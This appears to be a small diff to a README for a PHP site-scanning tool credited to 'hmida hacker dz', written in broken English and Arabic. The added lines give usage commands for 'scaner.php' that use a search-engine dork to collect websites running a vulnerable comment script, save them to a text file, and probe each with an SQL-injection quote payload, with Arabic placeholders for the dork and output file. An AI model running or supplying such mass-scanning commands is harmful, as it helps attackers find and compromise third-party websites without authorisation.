@@ -24,3 +24,11 @@ hmida hacker dz
 
 In order for the tool to work, you must use commands and commands that are in store for you
 
+
+
+dork and commonde
+php scaner.php --dork sw_comment.php?id=il -s test.txt -q 1,6 --exploit-get "?'´%270x27;"
+
+php scaner.php --dork نوع  الدورك -s الدي تود الحفظ عليه المواقع بصيغة txt -q 1,6 --exploit-get "?'´%270x27;"
+
+
